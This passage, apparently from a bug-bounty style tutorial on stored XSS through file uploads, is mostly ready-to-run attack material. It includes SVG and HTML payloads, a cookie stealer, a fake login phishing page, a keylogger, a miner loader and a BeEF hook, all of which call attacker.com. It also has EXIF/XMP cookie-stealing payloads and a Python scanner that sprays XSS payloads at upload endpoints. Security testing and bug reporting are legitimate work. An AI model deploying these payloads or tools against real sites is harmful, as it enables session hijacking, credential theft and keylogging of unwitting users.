  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvc2NyaXB0Pjwvc3ZnPg=="#x"/></svg>
  EOF

  cat > svg_payloads/17_image_error.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg"><image href="x" onerror="alert(document.domain)"/></svg>
  EOF

  cat > svg_payloads/18_a_javascript.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(document.domain)"><rect width="200" height="200" fill="red"/><text x="100" y="100" text-anchor="middle" fill="white">Click</text></a></svg>
  EOF

  cat > svg_payloads/19_handler_xml.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg"><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(document.domain)</handler></svg>
  EOF

  cat > svg_payloads/20_math_nest.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg"><foreignObject><math xmlns="http://www.w3.org/1998/Math/MathML"><mtext><table><mglyph><svg onload="alert(document.domain)"/></mglyph></table></mtext></math></foreignObject></svg>
  EOF

  # Upload all
  echo "═══ SVG XSS Payload Upload ═══"
  for svg in svg_payloads/*.svg; do
      NAME=$(basename "$svg")
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@${svg};filename=${NAME};type=image/svg+xml" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] ${NAME}"
  done

  # Also upload SVGs with image extension
  echo ""
  echo "─── SVG as image extension ───"
  for ext in jpg png gif; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@svg_payloads/06_onload.svg;filename=avatar.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] SVG as .${ext}"
  done
  ```
  :::
::

---

### HTML Upload XSS

::code-group
```bash [HTML Upload Variants]
UPLOAD_URL="https://target.com/api/upload"
COOKIE="session=TOKEN"
FIELD="file"

echo "═══ HTML File Upload XSS ═══"

# Cookie stealer
cat > /tmp/html_steal.html << 'EOF'
<!DOCTYPE html><html><body style="display:none">
<script>
fetch('https://attacker.com/xss_html',{method:'POST',body:JSON.stringify({
    cookie:document.cookie,localStorage:JSON.stringify(localStorage),
    sessionStorage:JSON.stringify(sessionStorage),url:location.href,
    origin:location.origin,domain:document.domain,referrer:document.referrer
}),mode:'no-cors'});
</script></body></html>
EOF

# Phishing page
cat > /tmp/html_phish.html << 'EOF'
<!DOCTYPE html><html><head><title>Session Expired</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:white;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1);width:380px;text-align:center}input{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:6px}button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:16px;cursor:pointer}</style></head>
<body><div class="card"><h2>🔒 Session Expired</h2><p style="color:#666;margin:12px 0">Please log in again</p>
<form id="f"><input name="email" placeholder="Email" required autofocus><input name="password" type="password" placeholder="Password" required><button>Sign In</button></form>
<script>document.getElementById('f').onsubmit=function(e){e.preventDefault();var d=new FormData(this);fetch('https://attacker.com/phish',{method:'POST',body:JSON.stringify({email:d.get('email'),password:d.get('password'),origin:location.origin}),mode:'no-cors'});this.innerHTML='<p style="color:green">✓ Verified. Redirecting...</p>';setTimeout(()=>location=location.origin+'/login',2000)}</script>
</div></body></html>
EOF

# Keylogger
cat > /tmp/html_keylog.html << 'EOF'
<!DOCTYPE html><html><body>
<h1>Meeting Notes</h1><p>Loading content...</p>
<script>
var b='';document.onkeypress=function(e){b+=e.key;if(b.length>=10){navigator.sendBeacon('https://attacker.com/keys',JSON.stringify({keys:b,url:location.href}));b=''}};
document.addEventListener('paste',function(e){navigator.sendBeacon('https://attacker.com/paste',JSON.stringify({pasted:(e.clipboardData||window.clipboardData).getData('text'),url:location.href}))});
</script></body></html>
EOF

# Crypto miner
cat > /tmp/html_miner.html << 'EOF'
<!DOCTYPE html><html><body><p>Loading...</p>
<script src="https://attacker.com/coinhive.min.js"></script>
<script>var m=new CoinHive.Anonymous('SITE_KEY');m.start();</script>
</body></html>
EOF

# BeEF hook
cat > /tmp/html_beef.html << 'EOF'
<!DOCTYPE html><html><body>
<script src="https://attacker.com:3000/hook.js"></script>
</body></html>
EOF

# Upload each with multiple extensions
for file in /tmp/html_steal.html /tmp/html_phish.html /tmp/html_keylog.html; do
    BASE=$(basename "$file" .html)
    for ext in html htm xhtml mhtml shtml; do
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
          -F "${FIELD}=@${file};filename=${BASE}.${ext};type=text/html" \
          -H "Cookie: $COOKIE")
        [ "$STATUS" = "200" ] && echo "[+] ${BASE}.${ext}"
    done
    for ct in "text/plain" "application/octet-stream" "image/jpeg"; do
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
          -F "${FIELD}=@${file};filename=${BASE}.html;type=${ct}" \
          -H "Cookie: $COOKIE")
        [ "$STATUS" = "200" ] && echo "[+] ${BASE}.html CT:${ct}"
    done
done

rm -f /tmp/html_*.html
```

```bash [Content Sniffing XSS]
UPLOAD_URL="https://target.com/api/upload"
COOKIE="session=TOKEN"
TARGET="https://target.com"

echo "═══ Content Sniffing XSS ═══"

# Check nosniff
for dir in uploads files media images; do
    NS=$(curl -sI "${TARGET}/${dir}/" 2>/dev/null | grep -i "x-content-type-options")
    echo "  /${dir}/: ${NS:-❌ nosniff MISSING — sniffing viable}"
done

echo ""
XSS='<script>alert("Sniff XSS: "+document.domain)</script>'

# Pure HTML as image extensions
for ext in jpg jpeg png gif bmp webp ico; do
    echo "$XSS" > "/tmp/sniff.${ext}"
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
      -F "file=@/tmp/sniff.${ext};filename=photo.${ext};type=image/jpeg" \
      -H "Cookie: $COOKIE")
    [ "$STATUS" = "200" ] && echo "[+] HTML as .${ext}"
done

# Polyglot: GIF header + HTML
printf 'GIF89a<html><script>alert("GIF sniff: "+document.domain)</script></html>' > /tmp/sniff_gif.gif
curl -s -o /dev/null -w "[%{http_code}] GIF+HTML polyglot\n" -X POST "$UPLOAD_URL" \
  -F "file=@/tmp/sniff_gif.gif;filename=avatar.gif;type=image/gif" -H "Cookie: $COOKIE"

# Polyglot: BMP header + HTML
printf 'BM<html><script>alert("BMP sniff: "+document.domain)</script></html>' > /tmp/sniff_bmp.bmp
curl -s -o /dev/null -w "[%{http_code}] BMP+HTML polyglot\n" -X POST "$UPLOAD_URL" \
  -F "file=@/tmp/sniff_bmp.bmp;filename=image.bmp;type=image/bmp" -H "Cookie: $COOKIE"

# HTML as text/plain (IE renders as HTML)
echo "$XSS" > /tmp/sniff.txt
curl -s -o /dev/null -w "[%{http_code}] HTML as .txt\n" -X POST "$UPLOAD_URL" \
  -F "file=@/tmp/sniff.txt;filename=readme.txt;type=text/plain" -H "Cookie: $COOKIE"

# HTML as CSV
echo "$XSS" > /tmp/sniff.csv
curl -s -o /dev/null -w "[%{http_code}] HTML as .csv\n" -X POST "$UPLOAD_URL" \
  -F "file=@/tmp/sniff.csv;filename=data.csv;type=text/csv" -H "Cookie: $COOKIE"

# No extension (always sniffed)
echo "$XSS" > /tmp/sniff_noext
curl -s -o /dev/null -w "[%{http_code}] HTML no extension\n" -X POST "$UPLOAD_URL" \
  -F "file=@/tmp/sniff_noext;filename=document;type=application/octet-stream" -H "Cookie: $COOKIE"

rm -f /tmp/sniff.* /tmp/sniff_gif.gif /tmp/sniff_bmp.bmp /tmp/sniff_noext
```
::

---

### EXIF Metadata XSS — Full Coverage

::tabs
  :::tabs-item{icon="i-lucide-image" label="EXIF Injection for Every Context"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ EXIF Metadata XSS — Complete ═══"

  # ── Create valid base image ──
  python3 -c "
  from PIL import Image
  img = Image.new('RGB', (200, 200))
  pixels = img.load()
  for x in range(200):
      for y in range(200):
          pixels[x,y] = ((x*7+50)%256, (y*13+100)%256, ((x+y)*3+75)%256)
  img.save('/tmp/exif_base.jpg', 'JPEG', quality=95)
  " 2>/dev/null

  # ── Context 1: HTML text context ──
  cp /tmp/exif_base.jpg /tmp/exif_ctx1.jpg
  exiftool \
    -Comment='<script>alert("EXIF Comment XSS: "+document.domain)</script>' \
    -ImageDescription='<img src=x onerror=alert("EXIF Desc XSS")>' \
    -Artist='<svg onload=alert("EXIF Artist XSS: "+document.domain)>' \
    -Copyright='<details open ontoggle=alert("EXIF Copyright XSS")>' \
    -Make='<marquee onstart=alert("EXIF Make XSS")>' \
    -Model='<body onload=alert("EXIF Model XSS")>' \
    -Software='<input autofocus onfocus=alert("EXIF Software XSS")>' \
    -UserComment='<video src=x onerror=alert("EXIF UserComment XSS")>' \
    -overwrite_original /tmp/exif_ctx1.jpg 2>/dev/null

  echo "[+] Context 1 (HTML text) payloads: $(strings /tmp/exif_ctx1.jpg | grep -c 'alert')"
  curl -s -o /dev/null -w "[%{http_code}] EXIF HTML context\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/exif_ctx1.jpg;filename=photo_ctx1.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── Context 2: HTML attribute context ──
  cp /tmp/exif_base.jpg /tmp/exif_ctx2.jpg
  exiftool \
    -Comment='" onmouseover="alert(\'EXIF attr XSS\')" x="' \
    -ImageDescription='" onfocus="alert(1)" autofocus tabindex="1" x="' \
    -Artist='"><img src=x onerror=alert("EXIF artist attr")><"' \
    -Copyright='" onclick="alert(1)" x="' \
    -Make='" style="animation-name:x" onanimationstart="alert(1)" x="' \
    -overwrite_original /tmp/exif_ctx2.jpg 2>/dev/null

  curl -s -o /dev/null -w "[%{http_code}] EXIF attribute context\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/exif_ctx2.jpg;filename=photo_ctx2.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── Context 3: JavaScript string context ──
  cp /tmp/exif_base.jpg /tmp/exif_ctx3.jpg
  exiftool \
    -Comment='";alert("EXIF JS XSS");//' \
    -Artist="';alert('EXIF JS single');//" \
    -Copyright='"+alert(1)+"' \
    -Make='`${alert(1)}`' \
    -overwrite_original /tmp/exif_ctx3.jpg 2>/dev/null

  curl -s -o /dev/null -w "[%{http_code}] EXIF JS context\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/exif_ctx3.jpg;filename=photo_ctx3.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── Context 4: JSON context ──
  cp /tmp/exif_base.jpg /tmp/exif_ctx4.jpg
  exiftool \
    -Comment='","xss":"<img src=x onerror=alert(1)>","x":"' \
    -Artist='","evil":"<script>alert(1)</script>","x":"' \
    -overwrite_original /tmp/exif_ctx4.jpg 2>/dev/null

  curl -s -o /dev/null -w "[%{http_code}] EXIF JSON context\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/exif_ctx4.jpg;filename=photo_ctx4.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── Weaponized: Cookie stealer in EXIF ──
  cp /tmp/exif_base.jpg /tmp/exif_weapon.jpg
  exiftool \
    -Comment='<img src=x onerror="fetch(`https://attacker.com/exif_steal?c=${document.cookie}&u=${location.href}`)">' \
    -Artist='<script>navigator.sendBeacon("https://attacker.com/exif",JSON.stringify({c:document.cookie,ls:JSON.stringify(localStorage)}))</script>' \
    -Copyright='<img src=x onerror="new Image().src=`https://attacker.com/exif_img?c=${btoa(document.cookie)}`">' \
    -overwrite_original /tmp/exif_weapon.jpg 2>/dev/null

  curl -s -o /dev/null -w "[%{http_code}] EXIF weaponized\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/exif_weapon.jpg;filename=vacation.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── XMP metadata XSS ──
  cp /tmp/exif_base.jpg /tmp/xmp_xss.jpg
  exiftool \
    -XMP-dc:Description='<script>alert("XMP Description XSS")</script>' \
    -XMP-dc:Creator='<img src=x onerror=alert("XMP Creator XSS")>' \
    -XMP-dc:Rights='<svg onload=alert("XMP Rights XSS")>' \
    -XMP-dc:Title='<details open ontoggle=alert("XMP Title XSS")>' \
    -XMP-xmp:CreatorTool='<body onload=alert("XMP Tool XSS")>' \
    -overwrite_original /tmp/xmp_xss.jpg 2>/dev/null

  curl -s -o /dev/null -w "[%{http_code}] XMP XSS\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/xmp_xss.jpg;filename=landscape.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  echo ""
  echo "[*] Check pages that display EXIF/metadata:"
  echo "    Gallery details, photo info, admin media panel,"
  echo "    image properties viewer, camera info section"

  rm -f /tmp/exif_base.jpg /tmp/exif_ctx*.jpg /tmp/exif_weapon.jpg /tmp/xmp_xss.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-image" label="Audio/Video/Document Metadata XSS"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ Non-Image Metadata XSS ═══"

  # ── MP3 ID3 Tag XSS ──
  # If the app displays audio metadata (artist, title, album)
  python3 -c "
  try:
      from mutagen.mp3 import MP3
      from mutagen.id3 import ID3, TIT2, TPE1, TALB, COMM
      import io

      # Create minimal MP3
      # (In practice, use a real small MP3 file)
      # Here we use a dummy approach
      open('/tmp/xss_audio.mp3', 'wb').write(b'\xff\xfb\x90\x00' + b'\x00' * 1000)

      audio = MP3('/tmp/xss_audio.mp3')
      audio.add_tags()
      audio.tags.add(TIT2(encoding=3, text=['<script>alert(\"ID3 Title XSS\")</script>']))
      audio.tags.add(TPE1(encoding=3, text=['<img src=x onerror=alert(\"ID3 Artist XSS\")>']))
      audio.tags.add(TALB(encoding=3, text=['<svg onload=alert(\"ID3 Album XSS\")>']))
      audio.save()
      print('[+] MP3 with XSS in ID3 tags')
  except Exception as e:
      print(f'[-] MP3 creation failed: {e}')
  " 2>/dev/null

  [ -f /tmp/xss_audio.mp3 ] && \
    curl -s -o /dev/null -w "[%{http_code}] MP3 ID3 XSS\n" -X POST "$UPLOAD_URL" \
      -F "${FIELD}=@/tmp/xss_audio.mp3;filename=song.mp3;type=audio/mpeg" \
      -H "Cookie: $COOKIE"

  # ── PDF Properties XSS ──
  python3 -c "
  try:
      from reportlab.pdfgen import canvas
      from reportlab.lib.pagesizes import letter
      import io

      buf = io.BytesIO()
      c = canvas.Canvas(buf, pagesize=letter)
      c.setTitle('<script>alert(\"PDF Title XSS\")</script>')
      c.setAuthor('<img src=x onerror=alert(\"PDF Author XSS\")>')
      c.setSubject('<svg onload=alert(\"PDF Subject XSS\")>')
      c.drawString(100, 700, 'Test document')
      c.save()

      with open('/tmp/xss_pdf.pdf', 'wb') as f:
          f.write(buf.getvalue())
      print('[+] PDF with XSS in properties')
  except Exception as e:
      print(f'[-] PDF creation failed: {e}')
  " 2>/dev/null

  [ -f /tmp/xss_pdf.pdf ] && \
    curl -s -o /dev/null -w "[%{http_code}] PDF properties XSS\n" -X POST "$UPLOAD_URL" \
      -F "${FIELD}=@/tmp/xss_pdf.pdf;filename=report.pdf;type=application/pdf" \
      -H "Cookie: $COOKIE"

  rm -f /tmp/xss_audio.mp3 /tmp/xss_pdf.pdf
  ```
  :::
::

---

## Phase 3 — Comprehensive Scanner

::code-collapse
```python [stored_xss_scanner.py]
#!/usr/bin/env python3
"""
Stored XSS via Upload — Comprehensive Scanner
Tests filename XSS, SVG, HTML, content sniffing, EXIF, and serving headers.
"""
import requests
import time
import struct
import re
import sys
import os
import urllib3
urllib3.disable_warnings()

class StoredXSSScanner:
    FILENAME_HTML = [
        '<script>alert("fn1")</script>.jpg',
        '<img src=x onerror=alert("fn2")>.jpg',
        '<svg onload=alert("fn3")>.jpg',
        '<svg/onload=alert("fn4")>.jpg',
        '<details open ontoggle=alert("fn5")>.jpg',
        '<input autofocus onfocus=alert("fn6")>.jpg',
        '<marquee onstart=alert("fn7")>.jpg',
        '<body onload=alert("fn8")>.jpg',
        '<video src=x onerror=alert("fn9")>.jpg',
        '<audio src=x onerror=alert("fn10")>.jpg',
        '<math><mtext><img src=x onerror=alert("fn11")></mtext></math>.jpg',
    ]

    FILENAME_ATTR = [
        '" onmouseover="alert(\'fa1\')" x=".jpg',
        '" onfocus="alert(\'fa2\')" autofocus x=".jpg',
        '" onclick="alert(\'fa3\')" x=".jpg',
        '"><img src=x onerror=alert("fa4")><".jpg',
        '"><svg onload=alert("fa5")><".jpg',
        "' onmouseover='alert(1)' x='.jpg",
    ]

    FILENAME_JS = [
        '";alert("fj1");//.jpg',
        "';alert('fj2');//.jpg",
        '"+alert(1)+"x.jpg',
        '`${alert(1)}`.jpg',
    ]

    SVG_PAYLOADS = {
        'script': '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("s1")</script></svg>',
        'onload': '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'s2\')"/>',
        'foreign': '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert("s3")</script></body></foreignObject></svg>',
        'animate': '<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(\'s4\')" attributeName="x" dur="1s"/></svg>',
        'cdata': '<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[alert("s5")]]></script></svg>',
        'image_err': '<svg xmlns="http://www.w3.org/2000/svg"><image href="x" onerror="alert(\'s6\')"/></svg>',
        'set_ev': '<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onmouseover" to="alert(\'s7\')"/><rect width="200" height="200"/></svg>',
    }

    HTML_PAYLOADS = {
        'script': '<html><body><script>alert("h1")</script></body></html>',
        'img': '<html><body><img src=x onerror=alert("h2")></body></html>',
        'svg': '<html><body><svg onload=alert("h3")></svg></body></html>',
    }

    SNIFF_PAYLOADS = [
        ('.jpg', 'image/jpeg', '<script>alert("sniff_jpg")</script>'),
        ('.gif', 'image/gif', 'GIF89a<script>alert("sniff_gif")</script>'),
        ('.bmp', 'image/bmp', 'BM<script>alert("sniff_bmp")</script>'),
        ('.txt', 'text/plain', '<script>alert("sniff_txt")</script>'),
        ('.csv', 'text/csv', '<script>alert("sniff_csv")</script>'),
        ('.bin', 'application/octet-stream', '<script>alert("sniff_bin")</script>'),
    ]

    def __init__(self, upload_url, target=None, field="file", cookies=None):
        self.upload_url = upload_url
        self.target = target or upload_url.rsplit('/', 2)[0]
        self.field = field
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        if cookies:
            self.session.cookies.update(cookies)
        self.image = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9'
        self.results = {'filename': [], 'svg': [], 'html': [], 'sniff': [], 'exif': [], 'headers': []}

    def upload(self, content, filename, ct='image/jpeg'):
        files = {self.field: (filename, content if isinstance(content, bytes) else content.encode(), ct)}
        try:
            r = self.session.post(self.upload_url, files=files, timeout=15)
            ok = r.status_code in [200, 201] and not any(
                w in r.text.lower() for w in ['error', 'invalid', 'denied', 'blocked', 'forbidden']
            )
            return ok, r.status_code, r.text
        except:
            return False, 0, ''

    def check_serving(self, filename):
        dirs = ['uploads', 'files', 'media', 'images', 'static', 'content', '']
        for d in dirs:
            url = f"{self.target}/{d}/{filename}" if d else f"{self.target}/{filename}"
            try:
                r = self.session.head(url, timeout=5)
                if r.status_code == 200:
                    return {
                        'url': url,
                        'ct': r.headers.get('Content-Type', ''),
                        'nosniff': 'nosniff' in r.headers.get('X-Content-Type-Options', '').lower(),
                        'attachment': 'attachment' in r.headers.get('Content-Disposition', '').lower(),
                    }
            except:
                pass
        return None

    def check_display(self, marker, pages=None):
        if pages is None:
            pages = [f'{self.target}/{p}' for p in
                     ['gallery', 'media', 'profile', 'files', 'uploads', 'admin/media', 'dashboard']]
        for page in pages:
            try:
                r = self.session.get(page, timeout=5)
                if marker in r.text:
                    encoded = marker.replace('<', '&lt;').replace('>', '&gt;')
                    unencoded = marker in r.text and encoded not in r.text
                    return page, unencoded
            except:
                pass
        return None, False

    def scan(self, delay=0.3):
        print(f"\n{'='*60}")
        print(f" Stored XSS via Upload — Full Scan")
        print(f"{'='*60}")
        print(f"[*] Upload: {self.upload_url}")
        print(f"[*] Target: {self.target}")
        print("-" * 60)

        # ── Phase 1: Filename XSS ──
        print("\n[*] Phase 1: Filename XSS")
        all_fn = self.FILENAME_HTML + self.FILENAME_ATTR + self.FILENAME_JS
        for payload in all_fn:
            ok, status, resp = self.upload(self.image, payload)
            if ok:
                self.results['filename'].append(payload)
                print(f"  [+] {payload[:60]}...")
            time.sleep(delay)
        print(f"  → {len(self.results['filename'])}/{len(all_fn)} accepted")

        # ── Phase 2: SVG XSS ──
        print("\n[*] Phase 2: SVG XSS")
        for name, content in self.SVG_PAYLOADS.items():
            ok, status, resp = self.upload(content.encode(), f'xss_{name}.svg', 'image/svg+xml')
            if ok:
                serving = self.check_serving(f'xss_{name}.svg')
                risk = 'LOW'
                if serving:
                    if not serving['nosniff'] and not serving['attachment']:
                        risk = 'HIGH'
                    if 'svg' in serving.get('ct', '').lower():
                        risk = 'CONFIRMED'
                self.results['svg'].append({'name': name, 'risk': risk, 'serving': serving})
                print(f"  [+] {name}: ACCEPTED ({risk})")

            # Also try SVG with image extension
            ok2, _, _ = self.upload(content.encode(), f'img_{name}.jpg', 'image/jpeg')
            if ok2:
                print(f"  [+] {name} as .jpg: ACCEPTED (needs content sniffing)")
            time.sleep(delay)

        # ── Phase 3: HTML Upload ──
        print("\n[*] Phase 3: HTML Upload")
        for name, content in self.HTML_PAYLOADS.items():
            for ext in ['html', 'htm', 'xhtml', 'shtml']:
                ok, status, resp = self.upload(content.encode(), f'xss.{ext}', 'text/html')
                if ok:
                    serving = self.check_serving(f'xss.{ext}')
                    risk = 'CONFIRMED' if serving and 'text/html' in serving.get('ct', '').lower() else 'POSSIBLE'
                    self.results['html'].append({'ext': ext, 'risk': risk})
                    print(f"  [+] .{ext}: ACCEPTED ({risk})")
                time.sleep(delay)

        # ── Phase 4: Content Sniffing ──
        print("\n[*] Phase 4: Content Sniffing")
        for ext, ct, content in self.SNIFF_PAYLOADS:
            ok, status, resp = self.upload(content.encode(), f'sniff{ext}', ct)
            if ok:
                serving = self.check_serving(f'sniff{ext}')
                if serving and not serving['nosniff'] and not serving['attachment']:
                    self.results['sniff'].append({'ext': ext, 'serving': serving})
                    print(f"  [+] {ext}: ACCEPTED, nosniff MISSING → XSS possible")
                elif serving:
                    print(f"  [*] {ext}: ACCEPTED but nosniff present")
            time.sleep(delay)

        # ── Phase 5: Upload path headers ──
        print("\n[*] Phase 5: Security Header Analysis")
        for path in ['/uploads/', '/files/', '/media/', '/images/', '/static/']:
            try:
                r = self.session.head(f"{self.target}{path}", timeout=5)
                if r.status_code not in [404, 0]:
                    nosniff = 'nosniff' in r.headers.get('X-Content-Type-Options', '').lower()
                    cd = r.headers.get('Content-Disposition', '')
                    if not nosniff:
                        self.results['headers'].append(path)
                        print(f"  [!] {path} — nosniff MISSING")
                    if not cd or 'inline' in cd.lower():
                        print(f"  [!] {path} — no Content-Disposition: attachment")
            except:
                pass

        # ── Summary ──
        print(f"\n{'='*60}")
        print(f" RESULTS SUMMARY")
        print(f"{'='*60}")
        total = sum(len(v) for v in self.results.values())
        print(f"Total XSS vectors: {total}")
        print(f"  Filename XSS accepted:  {len(self.results['filename'])}")
        print(f"  SVG XSS accepted:       {len(self.results['svg'])}")
        print(f"  HTML upload accepted:    {len(self.results['html'])}")
        print(f"  Content sniffing viable: {len(self.results['sniff'])}")
        print(f"  Missing security headers:{len(self.results['headers'])}")

        # Highlight confirmed
        confirmed_svg = [s for s in self.results['svg'] if s['risk'] == 'CONFIRMED']
        confirmed_html = [h for h in self.results['html'] if h['risk'] == 'CONFIRMED']

        if confirmed_svg:
            print(f"\n[!!!] CONFIRMED SVG XSS:")
            for s in confirmed_svg:
                url = s['serving']['url'] if s['serving'] else 'unknown'
                print(f"    ★ {s['name']} → {url}")

        if confirmed_html:
            print(f"\n[!!!] CONFIRMED HTML XSS:")
            for h in confirmed_html:
                print(f"    ★ .{h['ext']} → served as text/html")

        if self.results['filename']:
            print(f"\n[!] {len(self.results['filename'])} filename XSS payloads accepted")
            print(f"    → Check gallery, file listing, admin panel for rendering")

        return self.results


if __name__ == "__main__":
    scanner = StoredXSSScanner(
        upload_url="https://target.com/api/upload",
        target="https://target.com",
        field="file",
        cookies={"session": "AUTH_TOKEN"},
    )
    scanner.scan(delay=0.5)
```
::

---

## Phase 4 — Verification & Impact Proof

### Confirm XSS Execution

::tabs
  :::tabs-item{icon="i-lucide-check-circle" label="Browser Verification Steps"}
  ```text
  ═══ Step-by-Step XSS Verification ═══

  FOR FILENAME XSS:
  1. Upload file with XSS payload in filename
  2. Navigate to pages that display filenames:
     - File listing / media library
     - User profile (if avatar filename is shown)
     - Activity log / notification
     - Admin panel file manager
     - Search results
  3. If alert() fires → Stored XSS confirmed
  4. Screenshot: alert showing document.domain
  5. Verify: another user sees the same XSS

  FOR SVG XSS:
  1. Upload SVG with JavaScript
  2. Find the URL where SVG is served
  3. Open the URL directly in browser
  4. If alert() fires → Stored XSS confirmed
  5. Check: does it fire when SVG is embedded via <img>?
     - <img src="uploaded.svg"> → usually NO JS execution
     - Direct navigation to SVG URL → YES JS execution
     - <iframe src="uploaded.svg"> → YES JS execution
     - <embed src="uploaded.svg"> → YES JS execution
     - <object data="uploaded.svg"> → YES JS execution

  FOR HTML UPLOAD XSS:
  1. Upload HTML file
  2. Access the uploaded file URL
  3. If page renders as HTML with JS execution → confirmed

  FOR CONTENT SNIFFING XSS:
  1. Upload HTML content with .jpg extension
  2. Access the uploaded file URL
  3. Check: does browser render it as HTML?
  4. Test in: Chrome, Firefox, Safari, IE11
  5. Safari and IE11 are most likely to sniff

  FOR EXIF XSS:
  1. Upload image with XSS in EXIF fields
  2. Find pages that display EXIF data
  3. If alert() fires when viewing image details → confirmed

  EVIDENCE TO COLLECT:
  ✓ Screenshot of alert() showing document.domain
  ✓ curl command showing the upload request
  ✓ curl -sI showing missing security headers
  ✓ Browser name/version where XSS fires
  ✓ URL where the XSS triggers
  ✓ Proof that cookies are accessible (document.cookie)
  ✓ Proof that another user account triggers the XSS
  ```
  :::

  :::tabs-item{icon="i-lucide-check-circle" label="Safe PoC Generation"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"
  TS=$(date +%s)

  echo "═══ Safe PoC for Bug Report ═══"

  # ── Filename XSS PoC ──
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/poc_fn.jpg
  curl -s -o /dev/null -w "[%{http_code}] Filename PoC\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/poc_fn.jpg;filename=<img src=x onerror=alert('XSS_FN_${TS}')>.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── SVG XSS PoC ──
  cat > /tmp/poc_svg.svg << SVGEOF
  <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
    <rect width="200" height="200" fill="#3498db" rx="10"/>
    <text x="100" y="100" text-anchor="middle" fill="white" font-size="14">PoC Image</text>
    <script>
      // Stored XSS PoC — No malicious actions
      document.title = 'XSS_SVG_POC_${TS}';
      console.log('Stored XSS PoC: domain=' + document.domain);
      console.log('Cookie accessible: ' + (document.cookie ? 'YES' : 'HttpOnly/empty'));
    </script>
  </svg>
  SVGEOF

  curl -s -o /dev/null -w "[%{http_code}] SVG PoC\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/poc_svg.svg;filename=poc_${TS}.svg;type=image/svg+xml" \
    -H "Cookie: $COOKIE"

  # ── EXIF XSS PoC ──
  python3 -c "from PIL import Image; Image.new('RGB',(100,100),'green').save('/tmp/poc_exif.jpg','JPEG',quality=95)" 2>/dev/null
  exiftool -Comment="<script>document.title='EXIF_XSS_POC_${TS}'</script>" -overwrite_original /tmp/poc_exif.jpg 2>/dev/null

  curl -s -o /dev/null -w "[%{http_code}] EXIF PoC\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/poc_exif.jpg;filename=poc_exif_${TS}.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  echo ""
  echo "═══ Bug Report Template ═══"
  echo "Title: Stored XSS via [SVG Upload/Filename/EXIF] at POST /api/upload"
  echo "Severity: High (P2)"
  echo "PoC ID: ${TS}"
  echo ""
  echo "Steps to Reproduce:"
  echo "1. Upload [SVG file / file with XSS filename / image with XSS in EXIF]"
  echo "2. Navigate to [gallery/profile/media page/file listing]"
  echo "3. JavaScript executes in victim's browser context"
  echo ""
  echo "Impact:"
  echo "- Cookie theft → session hijacking"
  echo "- Account takeover via password/email change"
  echo "- Credential phishing via injected login form"
  echo "- Affects ALL users who view the affected page"

